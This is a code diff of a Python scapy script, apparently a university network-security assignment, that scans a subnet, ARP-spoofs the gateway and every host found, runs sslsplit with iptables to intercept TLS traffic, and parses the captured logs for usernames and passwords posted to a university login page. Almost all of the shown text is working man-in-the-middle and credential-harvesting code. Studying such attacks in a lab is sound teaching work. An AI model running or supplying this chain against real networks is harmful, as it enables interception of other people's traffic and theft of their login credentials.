@@ -6,133 +6,57 @@ import subprocess
 from scapy.all import *
 
 TEST_WEB_PAGE = 'https://e3.nycu.edu.tw/login/index.php'
-AP_IP = '192.168.92.2'
-AP_MAC = '00:50:56:f1:2b:c4'
-
-class COLOR:
-    BLACK  = '\x1b[30m'
-    RED    = '\x1b[31m'
-    GREEN  = '\x1b[32m'
-    YELLOW = '\x1b[33m'
-    BLUE   = '\x1b[34m'
-    VIOLET = '\x1b[35m'
-    BEIGE  = '\x1b[36m'
-    RESET  = '\x1b[0m'
+# collect basic information
+HOST_IP = get_if_addr(conf.iface)  # default interface
+HOST_MAC = get_if_hwaddr(conf.iface) # default interface
+GW_IP = conf.route.route("0.0.0.0")[2] # gateway
+SUBNET = GW_IP + '/24'
 
 def cmd(command):
     subprocess.run(command, shell=True)
 
-def scan_ip_mac():
-    """Scan IP and MAC address of available devices
+def scan_ip_mac(gw_ip, subnet):
+    """Scan IP and MAC address of available devices"""
 
-    Suppose the host only have two interfaces:
-    One is 'lo', the another one is the one to be used.
-
-    Scan availble devices by arping on the subnet of the target interface.
-    Collect corresponding IP and MAC from the response packet.
-
-    :returns: target interface name, IP to MAC dict
-    """
-    print(COLOR.YELLOW + 'Scanning for available devices.' + COLOR.RESET)
-    # scan interfaces (remove localhost)
-    infs = get_if_list()
-    infs.remove('lo')
-    inf = infs[0]
-
+    print('[+] Scanning devices in the subnet')
     ip_mac_dict = {}
-    # get ip address of the interface
-    inf_ip = get_if_addr(inf)
-    idx = inf_ip.rfind('.')
     # arp on the subnet of the interface (answerd, unanswered)
-    ans, unans = arping(f"{inf_ip[:idx]}.0/24", verbose=0)
-    
+    ans, unans = arping(subnet, verbose=0)
+    for s, r in ans: # (send, response)
+        ip_mac_dict[r[ARP].psrc] = r[Ether].src   
+
     # output
     print('Available devices')
     print('-----------------------------------------')
     print('IP\t\t\tMAC')
     print('-----------------------------------------')
-    # (send, response)
-    for s, r in ans:
-        # store the value in dict
-        ip_mac_dict[r[ARP].psrc] = r[Ether].src
-    
-    # remove AP IP from dict
-    ip_mac_dict.pop(AP_IP)
-
     for key, val in ip_mac_dict.items():
-        # print IP and MAC from the packet
+        if key == gw_ip:
+            continue
         print(f'{key}\t\t{val}')
-    
+    print('-----------------------------------------')
 
-    print()
+    return ip_mac_dict
 
-    return inf, ip_mac_dict
+def arp_spoofing(ip_mac_dict: dict, host_mac, gw_ip):
+    """ARP spoofing by sending to all possible victims"""
 
-def arp_spoofing_by_all(inf: str, ip_mac_dict: dict, target_ip: str):
-    """ARP spoofing by sending to all possible victims
-
-    Send packet to uplink and downlink
-
-    Change the MAC address field to attack's MAC, then send out.
-    - Uplink, ARP reply to WiFi AP.
-    - Downlink, ARP rerply to victim.
-
-    :param inf: target interface name
-    :param ip_mac_dict: IP to MAC dict
-    :param target_ip: AP IP or server IP that the attacker claims has
-    :returns: none
-    """
-    # get own MAC
-    own_mac = get_if_hwaddr(inf)
+    gw_mac = ip_mac_dict[gw_ip]
     # sent to all possible victims
-    print(COLOR.YELLOW + 'Sending ARP spoofing reply packets.' + COLOR.RESET)
-    for victim_ip in ip_mac_dict.keys():
+    print('[+] Sending ARP spoofing reply packets')
+    for victim_ip, victim_mac in ip_mac_dict.items():
+        if victim_ip == gw_ip:
+            continue
         # uplink and downlink
-        up_packet = ARP(op=2, hwsrc=own_mac, psrc=victim_ip, pdst=target_ip)
-        down_packet = ARP(op=2, hwsrc=own_mac, psrc=target_ip, pdst=victim_ip)
-
+        up_packet = ARP(op=2, hwsrc=host_mac, psrc=victim_ip, hwdst=gw_mac, pdst=gw_ip)
+        down_packet = ARP(op=2, hwsrc=host_mac, psrc=gw_ip, hwdst=victim_mac, pdst=victim_ip)
         # send packets (return for debugging)
         up_ret = send(up_packet, return_packets=True, verbose=0)
         down_ret = send(down_packet, return_packets=True, verbose=0)
 
-def arp_spoofing_by_sniffing(inf: str):
-    """ARP spoofing by sniffing
-
-    (If victim had not connect to WiFi yet.)
-    Victim will try to connect to AP,
-    therfore send arp broadcast to find the MAC of WiFi AP.
-    Sniff the ARP request packet from victim and spoof the packet with self's info.
-    Send out spoofed packets.
-
-    :param inf: interface to sniff
-    :returns: none
-    """
-    # get own MAC
-    own_mac = get_if_hwaddr(inf)
-    # sniff ARP packets on the interface
-    packets = sniff(iface=inf, count=1, filter='arp')
-    # find a request packet
-    for packet in packets:
-        if packet[ARP].op == 1: # request (who has  = 1)
-            target_packet = packet
-            break
-        else: # response (is at = 2)
-            continue
-    # parse information from the target packet
-    victim_ip = target_packet[ARP].psrc
-    ap_ip = target_packet[ARP].pdst
-    # fabricate and send ARP reply packets
-    send_packets(victim_ip, ap_ip, own_mac)
-    print(COLOR.YELLOW + 'ARP spoofing packets sent.' + COLOR.RESET)
-
 def parse_line(tokenline: str):
-    """Parse the given line
+    """Parse the given line"""
 
-    Get username and password from the line and print out.
-
-    :param tokenline: tokenline
-    :returns: none
-    """
     # parse lines
     tokens = tokenline.split('&')
     # parse username
@@ -175,15 +99,6 @@ def parse_login_token(logfolder: str):
         else:
             time.sleep(1)
 
-def ssl_generate_key():
-    """Generate RSA key and certificate
-    """
-    cmd('openssl rand -writerand ~/.rnd')
-    cmd('openssl genrsa -out ca.key 4096')
-    command = 'openssl req -new -x509 -days 30 -key ca.key -out ca.crt '
-    config = '-subj "/C=TW/ST=Taiwan/L=Hsinchu/O=NYCU/OU=HSINCHU/CN=*.NYCU.EDU.TW"'
-    cmd(command + config)
-
 def ssl_prerequisites():
     """SSL spliting prerequisites
 
@@ -215,7 +130,6 @@ def ssl_spliting():
     # prerequisites
     ssl_prerequisites()
     # generate RSA key and certificate (this will be done in make)
-    #ssl_generate_key()
 
     # check if folder exists
     if (not os.path.exists('tmp')):
@@ -226,9 +140,8 @@ def ssl_spliting():
         cmd('mkdir tmp/jaildir')
 
     try:
-        print()
-        print(COLOR.YELLOW + 'SSL spliting to fetch contents.' + COLOR.RESET)
-        print(COLOR.VIOLET + 'To stop SSL spliting, press ctrl+c.' + COLOR.RESET)
+        print('[+] SSL spliting to fetch contents')
+        print('[*] To stop SSL spliting, press ctrl+c')
         # run sslsplit (in background)
         cmd('sslsplit -d \
             -l connections.log \
@@ -244,7 +157,7 @@ def ssl_spliting():
         cmd('sudo killall sslsplit')
         # clear iptables
         cmd("iptables --flush")
-        print(COLOR.RED + 'Stop SSL spliting.' + COLOR.RESET)
+        print('[+] Stop SSL spliting.')
         return
 
 def main():
@@ -255,12 +168,16 @@ def main():
     2. ARP spoofing
     3. SSL spliting on encrypted connections
     """
+    print('[+] Basic information')
+    print(f'Host\t{HOST_IP}\t{HOST_MAC}')
+    print(f'Gateway\t{GW_IP}')
+    print(f'Subnet\t{SUBNET}')
+
     ### task 1 ###
-    inf, ip_mac_dict = scan_ip_mac()
+    ip_mac_dict = scan_ip_mac(GW_IP, SUBNET)
 
     ### task 2 ###
-    arp_spoofing_by_all(inf, ip_mac_dict, AP_IP)
-    #arp_spoofing_by_sniffing(inf)
+    arp_spoofing(ip_mac_dict, HOST_MAC, GW_IP)
 
     ### task 3 ###
     ssl_spliting()
